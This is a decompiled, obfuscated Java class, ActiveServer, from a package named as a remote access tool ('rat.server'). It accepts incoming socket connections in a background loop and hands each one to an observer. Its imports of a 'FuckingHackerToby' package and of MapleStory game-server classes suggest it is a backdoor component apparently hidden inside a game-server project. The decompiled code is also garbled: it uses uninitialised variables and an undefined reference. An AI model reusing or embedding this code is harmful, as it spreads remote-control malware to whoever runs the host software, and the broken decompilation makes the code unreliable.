/*
 * Decompiled with CFR 0.150.
 */
package de.sogomn.rat.server;

import FuckingHackerToby.U;
import FuckingHackerToby.ta;
import de.sogomn.rat.server.IServerObserver;
import handling.world.guild.MapleGuildSummary;
import java.net.Socket;

public final class ActiveServer
extends U {
    private /* synthetic */ IServerObserver ALLATORIxDEMO;
    private /* synthetic */ Thread d;

    public /* synthetic */ void setObserver(IServerObserver a2) {
        a.ALLATORIxDEMO = a2;
    }

    @Override
    public /* synthetic */ void close() {
        ActiveServer a2;
        ActiveServer activeServer = a2;
        super.close();
        if (activeServer.d != null) {
            a2.d.interrupt();
            a2.d = null;
        }
        if (a2.ALLATORIxDEMO != null) {
            a2.ALLATORIxDEMO.closed(a2);
        }
    }

    private /* synthetic */ ta ALLATORIxDEMO() {
        ActiveServer a2;
        Socket socket = a2.acceptConnection();
        if (socket == null) {
            return null;
        }
        return new ta(socket);
    }

    public /* synthetic */ ActiveServer(int a2) {
        super(a2);
        ActiveServer a3;
    }

    public /* synthetic */ void start() {
        ActiveServer a2;
        Runnable runnable = () -> {
            ActiveServer a2;
            while (a2.isOpen()) {
                ActiveServer activeServer = a2;
                ta ta2 = activeServer.ALLATORIxDEMO();
                if (activeServer.ALLATORIxDEMO == null || ta2 == null) continue;
                a2.ALLATORIxDEMO.connected(a2, ta2);
            }
        };
        a2.d = new Thread(runnable, MapleGuildSummary.ALLATORIxDEMO("a\u000b@\u0018W\u001c"));
        a2.d.start();
    }
}

